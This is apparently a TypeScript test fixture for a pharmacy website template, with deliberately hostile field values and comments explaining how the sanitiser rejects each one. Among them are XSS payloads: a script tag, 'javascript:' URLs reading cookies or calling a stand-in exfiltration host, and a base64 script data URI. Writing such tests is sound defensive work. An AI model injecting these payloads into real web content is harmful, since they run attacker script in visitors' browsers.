/**
 * Un gérant qui saisit n'importe quoi — volontairement ou non. Aucune de ces
 * valeurs ne doit atteindre le DOM, et la page doit rester utilisable.
 *
 * Chaque entrée est là pour une raison précise, notée en commentaire. Cocher
 * « données hostiles » dans la preview affiche le rendu obtenu.
 */
export const pharmacieHostile: unknown = {
	pharmacyInfo: {
		name: 'Pharmacie <script>alert(1)</script> du Port',
		address: '12 quai des Belges',
		// Protocole hors allowlist : `link()` le refuse, le bouton d'appel disparaît.
		phone: 'javascript:alert(document.cookie)',
		// `image()` n'accepte que https : les `data:` piégés sont écartés.
		logo: 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='
	},
	hero: {
		// Un titre de 5 000 caractères casse une mise en page : la borne l'écarte,
		// donc la section entière disparaît (le titre est requis).
		title: 'A'.repeat(5000),
		tagline: 'Cette section ne devrait pas s’afficher du tout.'
	},
	openingHours: {
		title: 'Horaires',
		days: [
			{ label: 'Lundi', hours: '9h – 19h' },
			// Entrée incomplète : écartée, les autres jours restent affichés.
			{ label: 'Mardi' },
			{ hours: '9h – 19h' },
			{ label: 'Mercredi', hours: '9h – 19h' }
		],
		note: 42
	},
	services: {
		title: 'Nos services',
		// Pas un tableau : `list()` rend une liste vide, donc la section disparaît.
		items: { name: 'Vaccination' }
	},
	brands: {
		title: 'Marques',
		items: [
			{ name: 'Marque honnête', logo: 'https://picsum.photos/seed/ok/120/60' },
			// URL de site piégée : le lien n'est pas rendu, le nom reste affiché.
			{ name: 'Marque piégée', site: 'javascript:fetch("https://exfiltration.example")' },
			// Logo en http simple : refusé (https uniquement).
			{ name: 'Marque en clair', logo: 'http://exemple.fr/logo.png' }
		]
	},
	team: {
		title: 'L’équipe',
		members: [
			{ name: 'Claire Ferrand', role: 'Titulaire', note: null },
			// Sans rôle : membre écarté, le reste de l'équipe s'affiche.
			{ name: 'Fantôme' },
			null,
			'pas un objet'
		]
	},
	testimonials: {
		title: 'Avis',
		// 800 avis : bornés à 30, la page reste lisible.
		items: Array.from({ length: 800 }, (_, index) => ({
			author: `Client ${index}`,
			quote: 'Avis généré en masse.',
			// Note hors bornes : ignorée, l'avis reste affiché sans étoiles.
			rating: 99
		}))
	}
};

/**
 * Un ordre stocké en base devenu incohérent : doublon, section inconnue,
 * section absente du design, et une section légitime oubliée.
 */
export const ordreCorrompu: unknown = [
	'testimonials',
	'testimonials',
	'sectionQuiNExistePas',
	'hero',
	'pharmacyInfo'
];
